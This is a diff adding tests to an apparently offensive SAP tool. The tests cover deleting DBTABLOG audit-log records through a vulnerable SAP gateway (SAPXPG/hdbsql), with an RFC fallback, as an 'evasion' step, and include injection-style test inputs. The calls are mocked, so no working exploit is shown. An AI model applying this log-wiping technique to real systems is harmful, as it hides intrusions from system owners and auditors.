@@ -2779,3 +2779,250 @@ def test_dbtablog_purge_returns_error_on_purge_failure():
     assert "purge failed" in out["error"]
     assert out.get("base_date") == "20260626"
     assert out.get("base_time") == "100537"
+
+
+# ---------------------------------------------------------------------------
+# GW SAPXPG → hdbsql delivery (HANA-only primary path)
+# ---------------------------------------------------------------------------
+
+def test_build_hana_delete_sql_all_tables():
+    sql = sap_dbtablog_purge._build_hana_delete_sql(
+        "20260626", "102632")
+    assert sql.startswith("DELETE FROM SAPHANADB.DBTABLOG WHERE ")
+    assert "LOGDATE > '20260626'" in sql
+    assert "LOGDATE = '20260626' AND LOGTIME > '102632'" in sql
+    assert "TABNAME IN" not in sql
+
+
+def test_build_hana_delete_sql_with_tabname_filter():
+    sql = sap_dbtablog_purge._build_hana_delete_sql(
+        "20260626", "102632", tabname_filter=["RFCDES", "USR02"])
+    assert "TABNAME IN ('RFCDES', 'USR02')" in sql
+
+
+def test_build_hana_delete_sql_uppercases_tabnames():
+    sql = sap_dbtablog_purge._build_hana_delete_sql(
+        "20260626", "102632", tabname_filter=["  rfcdes  "])
+    assert "'RFCDES'" in sql
+    assert "rfcdes" not in sql
+
+
+def test_build_hana_delete_sql_custom_schema():
+    sql = sap_dbtablog_purge._build_hana_delete_sql(
+        "20260626", "102632", schema="SAPSR3")
+    assert "DELETE FROM SAPSR3.DBTABLOG" in sql
+
+
+def test_build_hana_delete_sql_rejects_bad_schema():
+    with pytest.raises(ValueError):
+        sap_dbtablog_purge._build_hana_delete_sql(
+            "20260626", "102632", schema="bad; DROP")
+
+
+def test_build_hana_delete_sql_rejects_bad_date():
+    with pytest.raises(ValueError):
+        sap_dbtablog_purge._build_hana_delete_sql("26.06.2026", "102632")
+
+
+def test_build_hana_delete_sql_rejects_bad_tabname():
+    with pytest.raises(ValueError):
+        sap_dbtablog_purge._build_hana_delete_sql(
+            "20260626", "102632", tabname_filter=["RFC'DES"])
+
+
+def test_purge_via_gw_refuses_non_hana_node():
+    node = SAPNode(sid="S4H", hostname="s4h", ip="10.0.0.1")
+    node.db_type = "ORA"
+    node.gw_vulnerable = True
+    node.gw_vulnerable_port = 3300
+    r = sap_dbtablog_purge.purge_dbtablog_via_gw_hdbsql(
+        node, "20260626", "102632")
+    assert r["ok"] is False
+    assert "HANA-only" in r["error"]
+
+
+def test_purge_via_gw_refuses_when_not_gw_vulnerable():
+    node = SAPNode(sid="S4H", hostname="s4h", ip="10.0.0.1")
+    node.db_type = "HDB"
+    node.gw_vulnerable = False
+    r = sap_dbtablog_purge.purge_dbtablog_via_gw_hdbsql(
+        node, "20260626", "102632")
+    assert r["ok"] is False
+    assert "not GW-vulnerable" in r["error"]
+
+
+def _import_writers_safely():
+    """sap_db_sql_writers has a circular dep with sapmap_exploit that
+    only resolves cleanly when sapmap_exploit is loaded first (because
+    it defines ``_gw_connect`` before its own import of the writer).
+    Encapsulate the dance once so each test stays readable."""
+    import sapmap_exploit  # noqa: F401  — primes the chain
+    import sap_db_sql_writers as _w
+    return _w
+
+
+def test_purge_via_gw_calls_execute_sql_via_gateway():
+    sap_db_sql_writers = _import_writers_safely()
+    node = SAPNode(sid="S4H", hostname="s4h", ip="10.0.0.1")
+    node.db_type = "HDB"
+    node.gw_vulnerable = True
+    node.gw_vulnerable_port = 3300
+    node.os_type = "LINUX"
+
+    seen = {}
+
+    def _fake_exec(host, gw_port, sid, hostname, sqls, db_type,
+                    os_type, saprouter=""):
+        seen["host"] = host
+        seen["gw_port"] = gw_port
+        seen["sqls"] = sqls
+        seen["db_type"] = db_type
+        return True
+
+    with patch.object(sap_db_sql_writers, "_execute_sql_via_gateway",
+                       side_effect=_fake_exec):
+        r = sap_dbtablog_purge.purge_dbtablog_via_gw_hdbsql(
+            node, "20260626", "102632", tabname_filter=["RFCDES"])
+
+    assert r["ok"] is True
+    assert r["via"] == "gw_hdbsql"
+    assert r["deleted_count"] == -1
+    assert seen["gw_port"] == 3300
+    assert seen["db_type"] == "HDB"
+    assert len(seen["sqls"]) == 1
+    assert "RFCDES" in seen["sqls"][0]
+    assert "20260626" in seen["sqls"][0]
+
+
+def test_purge_via_gw_surfaces_gw_failure():
+    sap_db_sql_writers = _import_writers_safely()
+    node = SAPNode(sid="S4H", hostname="s4h", ip="10.0.0.1")
+    node.db_type = "HDB"
+    node.gw_vulnerable = True
+    node.gw_vulnerable_port = 3300
+
+    with patch.object(sap_db_sql_writers, "_execute_sql_via_gateway",
+                       return_value=False):
+        r = sap_dbtablog_purge.purge_dbtablog_via_gw_hdbsql(
+            node, "20260626", "102632")
+    assert r["ok"] is False
+    assert "reported failure" in r["error"]
+
+
+# ---------------------------------------------------------------------------
+# Dispatcher in tier3_dbtablog_purge: GW first on HANA+gw_vuln, RFC fallback
+# ---------------------------------------------------------------------------
+
+def test_dbtablog_purge_dispatches_gw_first_on_hana_gw_vuln():
+    state = SAPMAPState()
+    state.evasion = {"allow_evasion": True}
+    node = SAPNode(sid="S4H", hostname="s4h", ip="10.0.0.1")
+    node.system_type = "ABAP"
+    node.db_type = "HDB"
+    node.gw_vulnerable = True
+    node.gw_vulnerable_port = 3300
+
+    base_resp = {"ok": True, "base_date": "20260626",
+                 "base_time": "102632", "raw": [], "error": ""}
+    gw_resp = {"ok": True, "deleted_count": -1, "remaining_count": -1,
+               "raw": [], "error": "", "via": "gw_hdbsql"}
+
+    with patch("sap_dbtablog_purge.read_baseline_timestamp",
+                return_value=base_resp), \
+         patch("sap_dbtablog_purge.purge_dbtablog_via_gw_hdbsql",
+                return_value=gw_resp) as mock_gw, \
+         patch("sap_dbtablog_purge.purge_dbtablog") as mock_rfc:
+        out = sapmap_evasion_tier3.tier3_dbtablog_purge(
+            state, node, hold_seconds=0)
+
+    assert out["ok"] is True
+    assert out["via"] == "gw_hdbsql"
+    mock_gw.assert_called_once()
+    mock_rfc.assert_not_called()
+
+
+def test_dbtablog_purge_falls_back_to_rfc_when_gw_fails():
+    state = SAPMAPState()
+    state.evasion = {"allow_evasion": True}
+    node = SAPNode(sid="S4H", hostname="s4h", ip="10.0.0.1")
+    node.system_type = "ABAP"
+    node.db_type = "HDB"
+    node.gw_vulnerable = True
+    node.gw_vulnerable_port = 3300
+
+    base_resp = {"ok": True, "base_date": "20260626",
+                 "base_time": "102632", "raw": [], "error": ""}
+    gw_fail = {"ok": False, "deleted_count": -1, "remaining_count": -1,
+               "raw": [], "error": "GW SAPXPG hdbsql DELETE reported failure",
+               "via": "gw_hdbsql"}
+    rfc_ok = {"ok": True, "deleted_count": 4, "remaining_count": 0,
+              "raw": [], "error": "", "via": "rfc_install_and_run"}
+
+    with patch("sap_dbtablog_purge.read_baseline_timestamp",
+                return_value=base_resp), \
+         patch("sap_dbtablog_purge.purge_dbtablog_via_gw_hdbsql",
+                return_value=gw_fail) as mock_gw, \
+         patch("sap_dbtablog_purge.purge_dbtablog",
+                return_value=rfc_ok) as mock_rfc:
+        out = sapmap_evasion_tier3.tier3_dbtablog_purge(
+            state, node, hold_seconds=0)
+
+    assert out["ok"] is True
+    assert out["via"] == "rfc_install_and_run"
+    assert out["deleted_count"] == 4
+    mock_gw.assert_called_once()
+    mock_rfc.assert_called_once()
+
+
+def test_dbtablog_purge_skips_gw_when_not_hana():
+    state = SAPMAPState()
+    state.evasion = {"allow_evasion": True}
+    node = SAPNode(sid="S4H", hostname="s4h", ip="10.0.0.1")
+    node.system_type = "ABAP"
+    node.db_type = "ORA"
+    node.gw_vulnerable = True
+    node.gw_vulnerable_port = 3300
+
+    base_resp = {"ok": True, "base_date": "20260626",
+                 "base_time": "102632", "raw": [], "error": ""}
+    rfc_ok = {"ok": True, "deleted_count": 2, "remaining_count": 0,
+              "raw": [], "error": "", "via": "rfc_install_and_run"}
+
+    with patch("sap_dbtablog_purge.read_baseline_timestamp",
+                return_value=base_resp), \
+         patch("sap_dbtablog_purge.purge_dbtablog_via_gw_hdbsql") as mock_gw, \
+         patch("sap_dbtablog_purge.purge_dbtablog",
+                return_value=rfc_ok) as mock_rfc:
+        out = sapmap_evasion_tier3.tier3_dbtablog_purge(
+            state, node, hold_seconds=0)
+
+    assert out["ok"] is True
+    assert out["via"] == "rfc_install_and_run"
+    mock_gw.assert_not_called()
+    mock_rfc.assert_called_once()
+
+
+def test_dbtablog_purge_skips_gw_when_not_gw_vulnerable():
+    state = SAPMAPState()
+    state.evasion = {"allow_evasion": True}
+    node = SAPNode(sid="S4H", hostname="s4h", ip="10.0.0.1")
+    node.system_type = "ABAP"
+    node.db_type = "HDB"
+    node.gw_vulnerable = False
+
+    base_resp = {"ok": True, "base_date": "20260626",
+                 "base_time": "102632", "raw": [], "error": ""}
+    rfc_ok = {"ok": True, "deleted_count": 1, "remaining_count": 0,
+              "raw": [], "error": "", "via": "rfc_install_and_run"}
+
+    with patch("sap_dbtablog_purge.read_baseline_timestamp",
+                return_value=base_resp), \
+         patch("sap_dbtablog_purge.purge_dbtablog_via_gw_hdbsql") as mock_gw, \
+         patch("sap_dbtablog_purge.purge_dbtablog",
+                return_value=rfc_ok):
+        out = sapmap_evasion_tier3.tier3_dbtablog_purge(
+            state, node, hold_seconds=0)
+
+    assert out["ok"] is True
+    assert out["via"] == "rfc_install_and_run"
+    mock_gw.assert_not_called()
